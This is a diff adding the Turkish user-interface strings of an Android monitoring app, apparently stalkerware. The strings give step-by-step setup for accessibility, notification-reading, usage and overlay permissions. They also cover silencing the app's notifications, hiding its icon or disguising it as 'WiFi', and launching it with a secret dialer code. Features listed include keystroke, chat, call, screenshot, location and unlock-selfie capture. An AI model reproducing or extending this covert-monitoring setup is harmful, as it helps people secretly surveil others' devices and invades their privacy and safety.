@@ -1,0 +1,334 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Ana ekrana git</string>
+    <string name="abc_action_bar_up_description">Yukarı git</string>
+    <string name="abc_action_menu_overflow_description">Diğer seçenekler</string>
+    <string name="abc_action_mode_done">Bitti</string>
+    <string name="abc_activity_chooser_view_see_all">Tümünü göster</string>
+    <string name="abc_activitychooserview_choose_application">Bir uygulama seçin</string>
+    <string name="abc_capital_off">KAPAT</string>
+    <string name="abc_capital_on">AÇ</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">sil</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">İşlev+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Üst Karakter+</string>
+    <string name="abc_menu_space_shortcut_label">boşluk</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menü+</string>
+    <string name="abc_search_hint">Ara…</string>
+    <string name="abc_searchview_description_clear">Sorguyu temizle</string>
+    <string name="abc_searchview_description_query">Arama sorgusu</string>
+    <string name="abc_searchview_description_search">Ara</string>
+    <string name="abc_searchview_description_submit">Sorguyu gönder</string>
+    <string name="abc_searchview_description_voice">Sesli arama</string>
+    <string name="abc_shareactionprovider_share_with">Şununla paylaş</string>
+    <string name="abc_shareactionprovider_share_with_application">%s ile paylaş</string>
+    <string name="abc_toolbar_collapse_description">Daralt</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Eski sürümü buradan kaldırın</string>
+    <string name="dialog_allow_unknown_source">Uygulamayı güncellemek için \"Bilinmeyen uygulamaları yükle\"ye izin verin.</string>
+    <string name="dialog_battery_optim">Uygulamanın düzgün çalışması için lütfen Pil kullanımını optimize et seçeneğini kapatın</string>
+    <string name="dialog_battery_optim_on">Pil kullanımını optimize etme özelliği hala etkin!</string>
+    <string name="dialog_battery_optim_set">":
+ - \"Optimize edilmedi\" to \"Tüm uygulamalar\" olarak değiştirin
+ - \"%1$s\" uygulamasını bulun ve kapatın
+ - \"Geri\" butonuna tıklayın"</string>
+    <string name="dialog_no">Hayır</string>
+    <string name="dialog_ok">Tamam</string>
+    <string name="dialog_perm_accessibility">Lütfen uygulama erişilebilirlik hizmetini etkinleştirin</string>
+    <string name="dialog_perm_accessibility_on">Uygulama erişilebilirlik hizmeti hala devre dışı!</string>
+    <string name="dialog_perm_app">"Lütfen tüm uygulama izinlerini etkinleştirin:
+ - \"İzinler\" öğesini aç
+ - Tüm izinleri etkinleştir"</string>
+    <string name="dialog_perm_app_off">Bazı uygulama izinleri hala devre dışı!</string>
+    <string name="dialog_perm_notif">Lütfen uygulama bildirimlerini devre dışı bırakın</string>
+    <string name="dialog_perm_notif_on">Uygulama bildirimleri hala etkin!</string>
+    <string name="dialog_perm_overlay">"Ekran Görüntüleri almak ve Selfie'lerin Kilidini Açmak için lütfen \"Üstte görün\" iznini etkinleştirin"</string>
+    <string name="dialog_perm_overlay_off">\"Üstte görün\" izni hala devre dışı!</string>
+    <string name="dialog_perm_read_notif">Lütfen %1$s uygulamasının bildirimleri okumasına izin verin</string>
+    <string name="dialog_perm_read_notif_off">Bildirimleri okuma erişimi hâlâ devre dışı!</string>
+    <string name="dialog_perm_scr">"Ekran görüntüleri almak için lütfen %1$s ekran görüntüsünü yakalayın:
+ - \"Bir daha gösterme\" öğesini etkinleştir
+ - \"Şimdi başla\" düğmesine hafifçe vurun"</string>
+    <string name="dialog_perm_scr_off">Ekran görüntüsü alma özelliği hala devre dışı!</string>
+    <string name="dialog_perm_usage">"Ekran görüntüleri almak için lütfen \"Kullanım verisi erişimi\" iznini etkinleştirin:
+ - \"%1$s\" uygulamasını bulup tıklayın
+ - Kullanım erişimini etkinleştirin
+ - \"Geri\" düğmesine iki kez tıklayın"</string>
+    <string name="dialog_perm_usage_off">\"Kullanım verilerine erişim\" izni hala devre dışı!</string>
+    <string name="dialog_pin_current">Mevcut PIN</string>
+    <string name="dialog_pin_retype">PIN kodunu tekrar yazın</string>
+    <string name="dialog_pin_specify">Yeni PIN</string>
+    <string name="dialog_run_app">Gizli uygulama aramayı açmak için:</string>
+    <string name="dialog_run_app_sticker">"Gizli uygulama kullanımını açmak için \"Sticker\" widget'ını kullanın"</string>
+    <string name="dialog_uninstall_ask">Monitörü kaldırmak istiyor musunuz?</string>
+    <string name="dialog_update">Güncelle</string>
+    <string name="dialog_wait">Lütfen bekleyiniz…</string>
+    <string name="dialog_yes">Evet</string>
+    <string name="email_msg_alarm">Aboneliğin süresi %1$s sonra dolar.</string>
+    <string name="email_msg_alarm_renew">"
+Lütfen aboneliğinizi yenileyin."</string>
+    <string name="email_msg_alarm_stop">Abonelik süresi doldu.</string>
+    <string name="email_msg_alarm_stop_logs">Abonelik başlatmadığınız takdirde ücretli raporlar silinir.</string>
+    <string name="event_count">Liste</string>
+    <string name="event_name">Etkinlik</string>
+    <string name="general_password">"Lütfen PIN'inizi Girin"</string>
+    <string name="global_settings_name">Ayarlar</string>
+    <string name="gm_now">şimdi</string>
+    <string name="hint_change_pin_new">Yeni PIN giriniz</string>
+    <string name="hint_enter_pin">PIN giriniz</string>
+    <string name="hint_sms_hiden">[Gizli]</string>
+    <string name="ignore">Bu adımı atla</string>
+    <string name="im_log_name">AM</string>
+    <string name="inst_accessibility_activate_action">HİZMETİ AÇ</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">İzlenecek Ek Etkinlikleri Seçin</string>
+    <string name="inst_accessibility_chats">Sohbet mesajları</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"Ekran içeriğine erişmek için erişilebilirlik hizmetini etkinleştirmeniz gerekmektedir:
+Listeden '%1$s' uygulamasını seçin ve etkinleştirin. Bu sayfaya geri dönün. (Sistem şu anda uygulamayı kapatabilir)"</string>
+    <string name="inst_accessibility_sites">Web siteleri geçmişi</string>
+    <string name="inst_call_recording">Telefon çağrı kayıtları</string>
+    <string name="inst_chat_recording">Sohbet çağrı kayıtları</string>
+    <string name="inst_chose_device_type">Lütfen cihaz türünü seçin</string>
+    <string name="inst_enable_location_access">"Uygulama konuma erişim gerektirir:\\n\\n1. \\'İzinler\\' ayarını bulup dokunun.\\n2. \\'Konum\\' ayarını bulup dokunun.\\n3. Etkinleştir: \\'Her zaman izin ver\\'"</string>
+    <string name="inst_finish_action">Kurulumu bitir</string>
+    <string name="inst_finish_caption">Yapılandırma Tamamlandı</string>
+    <string name="inst_finish_hint">"Yükleme tamamlandı!
+Hesabınızdaki günlüklere bakın."</string>
+    <string name="inst_hello_cancel">Yüklemeyi İptal Et</string>
+    <string name="inst_hello_caption">Bu Cihazı İzlenebilir Hale Getirme</string>
+    <string name="inst_hello_hint">Bu cihazı izlemek istiyorsanız, tüm yapılandırma adımlarını tamamlamanız gerekmektedir. Kayıtlı bir hesabınız olduğundan emin olun ve İLERİ butonuna basın.</string>
+    <string name="inst_license_caption">Son Kullanıcı Lisans Anlaşması</string>
+    <string name="inst_log_select_all">Tüm aktiviteler</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Takvim</string>
+    <string name="inst_log_select_calls">Arama günlükleri</string>
+    <string name="inst_log_select_caption">İzlenecek Cihaz Etkinlikleri</string>
+    <string name="inst_log_select_contacts">Kişilerler</string>
+    <string name="inst_log_select_gallery">Galeri</string>
+    <string name="inst_log_select_hint">Bazı seçenekleri işaretlemezseniz, bunları uzaktan açamazsınız. Bir cihaza fiziksel erişime ihtiyacınız olacaktır.</string>
+    <string name="inst_log_select_location">Konum</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Sistem olayları</string>
+    <string name="inst_log_select_system_hint">(SIM, pil, ağ bilgisi)</string>
+    <string name="inst_log_select_unlock">Ekran kilidi açma görüntüleri</string>
+    <string name="inst_log_typed_text">Yazılan Metin</string>
+    <string name="inst_login_activate">Etkinleştir</string>
+    <string name="inst_login_caption">Lütfen Kimlik Bilgilerinizi Girin</string>
+    <string name="inst_login_forgot_password">Parolanızı mı unuttunuz?</string>
+    <string name="inst_login_hint_email">E-posta giriniz</string>
+    <string name="inst_login_hint_password">Parola Giriniz</string>
+    <string name="inst_old_version_found">Olası hataları önlemek için lütfen aşağıdaki eski sürümleri kaldırın:</string>
+    <string name="inst_pin_caption">"PIN'inizi Oluşturun"</string>
+    <string name="inst_pin_change">"PIN'i değiştir"</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Android, uygulama simgelerini gizlemeyi kısıtlıyor. Uygulama, bir cihazda \"WiFi\" simgesinin altında görünecektir.</string>
+    <string name="inst_pin_hide_app">Uygulama simgesini gizle</string>
+    <string name="inst_pin_hint">Uygulama: ***%1$s### çevrilerek başlatılabilir</string>
+    <string name="inst_pin_turn_on">Uygulamayı PIN ile koruyun</string>
+    <string name="inst_rec_warning">Çağrılar, bazı Android modellerinde doğru şekilde kaydedilmeyebilir</string>
+    <string name="inst_requiremens_a11y">Erişilebilirlik Hizmeti</string>
+    <string name="inst_requiremens_a11y_hint">Genişletilmiş izleme fonksiyonları sağlamak için erişilebilirlik servisi gereklidir.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Yüklü (indirilmiş) hizmetlere dokunun.
+ 2. '%1$s' öğesine tıklayın.
+ 3. Anahtarı açın ve İzin Vere dokunun.
+ 4. Bu sayfaya dönene kadar sistem GERİ düğmesine dokunun."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Hizmet etkinleştirmesi engellenmişse, Ayarlar>Uygulamalar>'%1$s' öğesini açın, \"Kısıtlı Ayarlara İzin Ver\" seçeneğini bulun ve açın. Ayarlarda yoksa sağ üst köşedeki 3 noktaya tıklayın, ardından açın ve ardından servis aktivasyonunu tekrarlayın."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Erişilebilirlik hizmetini etkinleştirmek için:</string>
+    <string name="inst_requiremens_basic">Temel İzinler</string>
+    <string name="inst_requiremens_basic_hint">Uygulama, depolama alanına, telefon ayarlarına, arama günlüklerine ve kişilere erişim gerektirir.</string>
+    <string name="inst_requiremens_basic_instruction">"1. 'İzinler' ayarını bulup tıklayınız.
+
+2. Etkinleştiriniz:
+\u0009- İletişim
+\u0009- Telefon
+\u0009- Depolama
+
+3. Bu sayfaya dönünceye kadar sistem GERİ düğmesine dokunun."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. 'İzinler' ayarını bulup tıklayınız.
+
+2. Etkinleştiriniz:
+\u0009- Arama kayıtları
+\u0009- İletişim
+\u0009- Telefon
+\u0009- Depolama
+
+3. Bu sayfaya dönünceye kadar sistem GERİ düğmesine dokunun."</string>
+    <string name="inst_requiremens_basic_instruction_header">Yetkilere izin vermek için:</string>
+    <string name="inst_requiremens_battery">Pil Optimizasyonunu Devre Dışı Bırak</string>
+    <string name="inst_requiremens_battery_hint">Pil tasarrufu nedeniyle uygulamanın durmasını önlemek için uygulamanın her zaman arka planda çalışmasına izin verin (Pil Optimizasyonu KAPALI).</string>
+    <string name="inst_requiremens_caption">Uygulama Gereksinimleri</string>
+    <string name="inst_requiremens_everything_ready">Neredeyse bitti! Birkaç adım kaldı!</string>
+    <string name="inst_requiremens_files_access_header">Depolama erişimine izin vermek için:</string>
+    <string name="inst_requiremens_files_access_instruction">1. <b>"'%1$s'"</b>" uygulamasını görene kadar listeyi kaydırın.
+
+2. İzin vermek için anahtarı "<b>açın</b>".
+
+3. Bu sayfaya dönene kadar sistem "<b>GERİ</b> düğmesine dokunun.</string>
+    <string name="inst_requiremens_hint">Uygulamanın düzgün çalışması için lütfen listelenen tüm seçenekleri etkinleştirin.</string>
+    <string name="inst_requiremens_notifications">Uygulama Bildirimlerini Devre Dışı Bırak</string>
+    <string name="inst_requiremens_notifications_access">Bildirimlere Erişim</string>
+    <string name="inst_requiremens_notifications_access_hint">Bu izin bildirimlerin okunmasına izin verir.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. <b>\"%1$s\"</b>" uygulamasını görene kadar listeyi kaydırın. 
+
+2. İzin vermek için anahtarı "<b>açın</b>". 
+
+3. "<b>İzin Ver</b>"'e "<b>dokunun</b>". 
+
+4. Bu sayfaya dönene kadar sistem "<b>GERİ</b> düğmesine basın.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Bildirim erişimine izin vermek için:</string>
+    <string name="inst_requiremens_notifications_hint">Bu uygulamadan gelen bildirimler çok rahatsız edici olabileceğinden KAPATILMALIDIR.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. 'Bildirimler' ayarını bulup tıklayın.
+
+2. Ana kilidi "<b>KAPALI</b>" konuma getirin.
+
+3. Bu sayfaya dönene kadar sistem "<b>GERİ</b> düğmesine dokunun.</string>
+    <string name="inst_requiremens_notifications_instruction_26">"1. 'Bildirimleri göster' geçişini "<b>KAPALI</b>" konuma getirin.
+
+2. Bu sayfaya geri dönmek için sistem "<b>GERİ</b> düğmesine dokunun.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Bu uygulamadan gelen bildirimleri devre dışı bırakmak için:</string>
+    <string name="inst_requiremens_overlay">Kaplama İzni</string>
+    <string name="inst_requiremens_overlay_hint">Uygulama diğer uygulamaların üstünde görüntülenebilmelidir.</string>
+    <string name="inst_requiremens_usage">Kullanım Erişimi</string>
+    <string name="inst_requiremens_usage_hint">Bu izin, diğer uygulamaların etkinliklerini takip etmeye izin verir.</string>
+    <string name="inst_requiremens_usage_instruction">1. <b>"'%1$s'"</b>" uygulamasını görene kadar listeyi kaydırın.
+
+2. Uygulamaya dokunun.
+
+3. İzin vermek için anahtarı "<b>açın</b>".
+
+4. Bu sayfaya dönene kadar sistemin "<b>GERİ</b> düğmesine dokunun.</string>
+    <string name="inst_requiremens_usage_instruction_header">Kullanım erişimine izin vermek için:</string>
+    <string name="inst_screenshots_caption">Ne Tür Ekran Görüntüleri Kaydetmek İsterdiniz?</string>
+    <string name="inst_screenshots_hint">"Uygulamanın gelecekteki onaylar olmadan ekran görüntüsü almasına izin vermeniz gerekir. İzin isteği iletişim kutusunda 'Bir daha gösterme' onay kutusunu ayarlayın ve ŞİMDİ BAŞLAT düğmesine basın."</string>
+    <string name="inst_screenshots_im">Anlık Mesajlaşma</string>
+    <string name="inst_screenshots_sms">SMS/MMS</string>
+    <string name="inst_screenshots_timer">Güncel, Zamanlı Etkinlikler</string>
+    <string name="inst_screenshots_title">Ekran görüntüleri:</string>
+    <string name="inst_screenshots_web">Web Tarayıcıları</string>
+    <string name="inst_type_caption">Lütfen bu uygulamanın doğru bir şekilde kullanılacağını onaylayın</string>
+    <string name="inst_type_confirmation">Bu cihazın kullanıcısının izleme yazılımı hakkında bilgilendirildiğini onaylıyorum ve açık onaylarına sahibim</string>
+    <string name="inst_type_employee">Çalışanımın cihazı</string>
+    <string name="inst_type_intention">Aşağıdakileri izlemek için bu yazılımı kullanacağım:</string>
+    <string name="inst_type_kids">Çocuğumun cihazı</string>
+    <string name="inst_type_own">Kendi cihazım</string>
+    <string name="license_accept">Kabul ediyorum</string>
+    <string name="license_read">Şartları okudum ve anladım</string>
+    <string name="license_text"><b>1.</b>" Bu yazılımın, cihaz kullanımı ve kullanıcı etkinliği hakkında bilgi kaydedebileceğini, saklayabileceğini ve iletebileceğini biliyorsunuz. 
+ 
+"<b>2.</b>" Bu yazılımı kullanmanıza yalnızca aşağıdaki koşullarda izin verilir: 
+Bu yazılımı sahip olduğunuz ve kişisel olarak kullandığınız bir cihazda kullanıyorsanız; 
+İzlenecek cihazın sahibinin ve tüm kullanıcılarının açık yazılı izniniz var ise; 
+İzlenecek cihazın kullanıcısının yasal bir koruyucusu iseniz; 
+ 
+"<b>3.</b> Mahremiyet, gizlilik ve bu tür izleme yazılımlarının bulunduğunuz bölgede kullanımını kapsayan yasa ve düzenlemeleri biliyor ve bunlara uyuyorsunuz. Yazılımı kurmak veya kullanmak için tüm sorumluluğu üstlenirsiniz. Yazılımın geliştiricileri, satıcıları veya dağıtıcıları, yazılımı kurmanız veya kullanmanızdan kaynaklanan herhangi bir yasal ihlal veya sonuçtan sorumlu tutulamaz.</string>
+    <string name="log_files_name">Galeri</string>
+    <string name="log_name_audio">Ses</string>
+    <string name="log_name_file">Dosya</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Görüntü</string>
+    <string name="log_name_sticker">Çıkartma</string>
+    <string name="log_name_video">Video</string>
+    <string name="menu_change_email">E-posta ayarlarını değiştir</string>
+    <string name="menu_change_pin">"Uygulama PIN'ini değiştir"</string>
+    <string name="menu_check_app_state">Uygulama izinlerini kontrol et</string>
+    <string name="menu_check_update">Güncellemeleri kontrol et</string>
+    <string name="menu_clear">Yerel günlükleri temizle</string>
+    <string name="menu_close">Kapat</string>
+    <string name="menu_disable_pin_protection">PIN korumasını devre dışı bırak</string>
+    <string name="menu_enable_pin_protection">PIN korumasını etkinleştir</string>
+    <string name="menu_hide_icon">%1$s simgesini gizle</string>
+    <string name="menu_reset_app_perm">Uygulama izinlerini sıfırla</string>
+    <string name="menu_reset_license">Lisansı sıfırla</string>
+    <string name="menu_select_source">Ses kaynağını değiştir</string>
+    <string name="menu_show_icon">%1$s simgesini göster</string>
+    <string name="menu_uninstall">Kaldır</string>
+    <string name="module_calendar">Takvim etkinlikleri</string>
+    <string name="module_calls">Aramalar</string>
+    <string name="module_contacts">Kişiler</string>
+    <string name="module_location">Konum</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Ekran kilidi açma selfieleri</string>
+    <string name="module_screen_shot">Ekran görüntüleri</string>
+    <string name="module_sim">SIM kart değiştiriliyor</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Ziyaret edilen web siteleri</string>
+    <string name="next">sonraki</string>
+    <string name="search_menu_title">Ara</string>
+    <string name="skype_call">ÇALIYOR</string>
+    <string name="skype_call_cancel">Kapat</string>
+    <string name="skype_call_conn">BAĞLANIYOR</string>
+    <string name="skype_call_end">Aramayı Sonlandır</string>
+    <string name="skype_start">"Sesli mesajı yürüt, "</string>
+    <string name="skype_stop">Sesli mesajı duraklat</string>
+    <string name="status_Version">Uygulama sürümü:</string>
+    <string name="status_activated">Etkinleştirme</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">İnternet bağlantısı yok</string>
+    <string name="status_last_send">Son veri yükleme:</string>
+    <string name="status_last_sync">Son bağlantı:</string>
+    <string name="status_memory_usage">Hafıza kullanımı</string>
+    <string name="status_monitor_disabled">Monitör devre dışı</string>
+    <string name="status_monitor_enabled">Monitör etkin</string>
+    <string name="status_record">Kaydet</string>
+    <string name="status_send_data_period">Veri yükleme süresi</string>
+    <string name="status_server_connected">Bağlı</string>
+    <string name="status_valid">Tarihine kadar geçerli</string>
+    <string name="status_wifi">sadece Wi-Fi</string>
+    <string name="telegram_date_format_full">d MMM yyyy</string>
+    <string name="telegram_date_format_short">d MMM</string>
+    <string name="telegram_got">tarihinde alındı</string>
+    <string name="telegram_got_ans1">yanıt</string>
+    <string name="telegram_got_ans2">var</string>
+    <string name="telegram_loaded">indirildi</string>
+    <string name="telegram_pause">Duraklat</string>
+    <string name="telegram_sending">Gönderiliyor</string>
+    <string name="telegram_sent">tarihinde gönderildi</string>
+    <string name="telegram_video">Video</string>
+    <string name="telegram_viewed">kez görüntülendi</string>
+    <string name="telegram_voice">Sesli mesaj</string>
+    <string name="text_log_name">Yazılan metin</string>
+    <string name="time_day">g.</string>
+    <string name="time_hrs">Sa.</string>
+    <string name="time_min">dk.</string>
+    <string name="time_sec">sn.</string>
+    <string name="title_activity_installer">Installer</string>
+    <string name="toast_digit_pin">PIN yalnızca rakam içermelidir</string>
+    <string name="toast_empty_email">Hesap e-postasını giriniz</string>
+    <string name="toast_empty_password">Hesap şifresini giriniz</string>
+    <string name="toast_empty_pin">Uygulama PIN kodunu giriniz</string>
+    <string name="toast_error_activation">Aktivasyon hatası</string>
+    <string name="toast_hide_icon">Uygulama kapatıldıktan sonra %1$s simgesi gizlenecek.</string>
+    <string name="toast_length_pin">PIN yalnızca 4 basamak olmalıdır.</string>
+    <string name="toast_license_limit">lisans hatası.</string>
+    <string name="toast_license_locked">lisans kilitlendi.</string>
+    <string name="toast_logs_cleared">Yerel günlükler başarıyla temizlendi</string>
+    <string name="toast_no_inet">Lütfen internet bağlantısını kontrol edin</string>
+    <string name="toast_not_same_pin">PIN kodları eşleşmiyor</string>
+    <string name="toast_pin_changed">PIN başarıyla değiştirildi</string>
+    <string name="toast_server_not_available">Sunucu kullanılamıyor. İnternet bağlantısını kontrol edin veya daha sonra tekrar deneyin.</string>
+    <string name="toast_show_icon">Uygulama kapatıldıktan sonra %1$s simgesi görünecek.</string>
+    <string name="toast_unkn_err">bilinmeyen hata:</string>
+    <string name="toast_wrong_account_or_password">Yanlış hesap e-postası veya şifresi.</string>
+    <string name="toast_wrong_pin">Yanlış PIN</string>
+    <string name="today">bugün</string>
+    <string name="update_current_version">Geçerli sürüm: %1$s</string>
+    <string name="update_new_version">Yeni sürüm: %1$s</string>
+    <string name="update_status_error_disable_link">Güncelleme bağlantısı kullanılamıyor. Lütfen daha sonra tekrar deneyiniz</string>
+    <string name="update_status_error_disable_server">Sunucu kullanılamıyor. İnternet bağlantınızı kontrol ediniz</string>
+    <string name="update_status_error_download">Güncellemeler yüklenirken hata oluştu</string>
+    <string name="update_status_ok_check_link">Güncelleme bağlantısını doğrulanıyor</string>
+    <string name="update_status_ok_check_server">Sunucuya erişim doğrulanıyor.</string>
+    <string name="update_status_ok_download_update">Güncellemeler indiriliyor;</string>
+    <string name="update_status_ok_install">Güncellemeler yükleniyor;</string>
+    <string name="viber_change">Düzenle</string>
+    <string name="widget_enter_note">Metin giriniz</string>
+    <string name="widget_hint">Metin girmek için hafifçe dokununuz</string>
+    <string name="widget_name">Sticker</string>
+</resources>
